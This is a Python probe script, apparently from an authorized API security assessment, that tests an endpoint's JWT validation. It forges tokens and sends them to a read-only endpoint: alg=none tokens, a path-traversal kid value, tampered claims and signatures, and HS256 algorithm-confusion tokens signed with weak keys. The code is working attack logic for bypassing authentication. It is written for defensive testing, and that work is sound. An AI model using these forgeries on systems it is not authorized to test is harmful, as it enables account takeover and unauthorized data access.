"""Probe 4 — JWT attack suite (OWASP API2:2023 Broken Authentication).

Attacks tested (NON-DESTRUCTIVE — every malformed token is sent to a READ-ONLY
endpoint and we record only the response status + envelope; we never escalate
to write operations using a forged token):

  1. alg=none forgery: copy claims, set header.alg=none, drop signature.
  2. kid manipulation: header.kid = "../../../dev/null".
  3. claim tampering: mutate client_id claim, keep original signature.
  4. signature tampering: flip a single character in the signature.
  5. expiry replay: hold a token, sleep through ttl. (DOCUMENTED ONLY — skip
     in-line because TTL is 3600s and we have a 2-hour budget; see README.)
  6. truncated/empty token: Bearer "".

Reads valid token via run_flow.auth(), then ATTEMPTS the read on
GET /v1/users?limit=1 with each malformed token. A 200 to any of these is a
CRITICAL finding. 401 is the correct/safe response.

Token structure (header.claims only — both base64url-decoded for analysis;
RAW VALUES NEVER WRITTEN — we mask any base64 segment longer than 16 chars).

Run: python3 evidence/work/security/jwt-attack-suite/probe_jwt.py
"""
from __future__ import annotations

import base64
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Tuple

import httpx

HERE = Path(__file__).resolve().parent
WORK = HERE.parents[1]
if str(WORK) not in sys.path:
    sys.path.insert(0, str(WORK))

from _redact import redact_headers, redact_text  # noqa: E402
from run_flow import API_KEY, BASE_URL, auth  # noqa: E402

READ_URL = f"{BASE_URL}/v1/users?limit=1"


def b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def decompose(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
    """Decode JWT header + claims; return (header_dict, claims_dict, signature_str)."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a 3-segment JWT")
    h = json.loads(b64url_decode(parts[0]).decode("utf-8"))
    c = json.loads(b64url_decode(parts[1]).decode("utf-8"))
    return h, c, parts[2]


def mask_claim_values(d: Dict[str, Any]) -> Dict[str, Any]:
    """Mask long opaque strings in claims (sub, jti, etc.) for safe evidence write."""
    out: Dict[str, Any] = {}
    for k, v in d.items():
        if isinstance(v, str) and len(v) > 16:
            out[k] = f"REDACTED({len(v)})"
        else:
            out[k] = v
    return out


def attempt(label: str, token: str) -> Dict[str, Any]:
    """Send GET /v1/users with the (possibly forged) token; capture status + body excerpt."""
    headers = {
        "x-api-key": API_KEY,
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
    }
    t0 = time.perf_counter_ns()
    try:
        resp = httpx.get(READ_URL, headers=headers, timeout=15.0)
        elapsed_ms = (time.perf_counter_ns() - t0) / 1e6
        body_excerpt = resp.text[:400]
        # Redact any JWT-shaped substring in error body just in case
        body_excerpt = redact_text(body_excerpt)
        return {
            "label": label,
            "status": resp.status_code,
            "elapsed_ms": round(elapsed_ms, 2),
            "response_headers": {k.lower(): v for k, v in resp.headers.items()},
            "body_excerpt": body_excerpt,
            "request_headers": redact_headers(headers),
            "accepted_by_api": 200 <= resp.status_code < 300,
        }
    except Exception as e:
        return {"label": label, "error": str(e)}


def main() -> None:
    token = auth()
    if not token:
        print("AUTH FAILED — aborting probe 4")
        sys.exit(1)

    parts = token.split(".")
    if len(parts) != 3:
        print("Token is not a 3-segment JWT — type is", parts and len(parts))
        sys.exit(2)

    header, claims, signature = decompose(token)
    # Token structure dump — masked
    structure = {
        "captured_at": datetime.now(timezone.utc).isoformat(),
        "header": header,  # alg/typ/kid usually short — safe
        "claims_keys": sorted(claims.keys()),
        "claims_redacted": mask_claim_values(claims),
        "signature_length": len(signature),
    }
    (HERE / "01-token-structure.json").write_text(json.dumps(structure, indent=2))

    results: List[Dict[str, Any]] = []

    # Control: original token (1 call) — should be 200
    results.append(attempt("00-control-valid-token", token))

    # 1) alg=none
    forged_header = {**header, "alg": "none"}
    forged = (
        b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode())
        + "."
        + b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
        + "."
    )
    results.append(attempt("01-alg-none", forged))

    # 1b) alg=none with the OLD signature still appended (some parsers ignore it)
    forged_b = forged + signature
    results.append(attempt("01b-alg-none-with-sig", forged_b))

    # 2) kid manipulation — keep alg HS256/RS256 etc., but inject a weird kid
    forged_header_kid = {**header, "kid": "../../../dev/null"}
    forged_kid = (
        b64url_encode(json.dumps(forged_header_kid, separators=(",", ":")).encode())
        + "."
        + b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
        + "."
        + signature  # signature won't verify under new header — but if API skips kid validation entirely…
    )
    results.append(attempt("02-kid-pathtraversal", forged_kid))

    # 2b) drop kid entirely (if kid is required, this should fail)
    if "kid" in header:
        forged_header_no_kid = {k: v for k, v in header.items() if k != "kid"}
        forged_no_kid = (
            b64url_encode(json.dumps(forged_header_no_kid, separators=(",", ":")).encode())
            + "."
            + b64url_encode(json.dumps(claims, separators=(",", ":")).encode())
            + "."
            + signature
        )
        results.append(attempt("02b-kid-removed", forged_no_kid))

    # 3) Claim tampering — change client_id (or sub) to a different UUID, keep signature
    tampered_claims = dict(claims)
    if "client_id" in tampered_claims:
        tampered_claims["client_id"] = "00000000-0000-4000-8000-000000000000"
    elif "sub" in tampered_claims:
        tampered_claims["sub"] = "00000000-0000-4000-8000-000000000000"
    tampered = (
        b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url_encode(json.dumps(tampered_claims, separators=(",", ":")).encode())
        + "."
        + signature
    )
    results.append(attempt("03-claim-tampered-client_id", tampered))

    # 4) Signature tampering — flip first char of signature
    flipped = signature[0]
    new_first = "A" if flipped != "A" else "B"
    bad_sig = new_first + signature[1:]
    bad = ".".join([parts[0], parts[1], bad_sig])
    results.append(attempt("04-signature-flipped-1char", bad))

    # 5) Empty bearer
    results.append(attempt("05-empty-bearer", ""))

    # 6) Bearer with random garbage
    results.append(attempt("06-garbage-bearer", "this.is.not-a-jwt"))

    # 7) Token with alg=HS256 forged using empty secret (HS256 confusion)
    if header.get("alg", "").upper() in ("RS256", "RS384", "RS512", "ES256"):
        import hmac
        import hashlib

        forged_header_hs = {**header, "alg": "HS256"}
        msg = (
            b64url_encode(json.dumps(forged_header_hs, separators=(",", ":")).encode()).encode()
            + b"."
            + b64url_encode(json.dumps(claims, separators=(",", ":")).encode()).encode()
        )
        # try empty key
        sig_empty = hmac.new(b"", msg, hashlib.sha256).digest()
        token_hs_empty = msg.decode() + "." + b64url_encode(sig_empty)
        results.append(attempt("07a-hs256-confusion-empty-key", token_hs_empty))

        # try "secret" common
        sig_secret = hmac.new(b"secret", msg, hashlib.sha256).digest()
        token_hs_secret = msg.decode() + "." + b64url_encode(sig_secret)
        results.append(attempt("07b-hs256-confusion-secret-key", token_hs_secret))

    summary = {
        "captured_at": datetime.now(timezone.utc).isoformat(),
        "token_header": header,
        "token_claims_keys": sorted(claims.keys()),
        "read_url": READ_URL,
        "attempts": results,
        "any_forged_token_accepted": any(
            r.get("accepted_by_api") for r in results if r.get("label") not in ("00-control-valid-token",)
        ),
        "control_succeeded": results[0].get("accepted_by_api"),
    }
    out = HERE / "02-attack-results.json"
    out.write_text(json.dumps(summary, indent=2))
    print("Probe 4 outputs:")
    print(" -", HERE / "01-token-structure.json")
    print(" -", out)
    print(" any_forged_token_accepted:", summary["any_forged_token_accepted"])
    for r in results:
        print(f"  {r.get('label')}: status={r.get('status')} accepted={r.get('accepted_by_api')}")


if __name__ == "__main__":
    main()
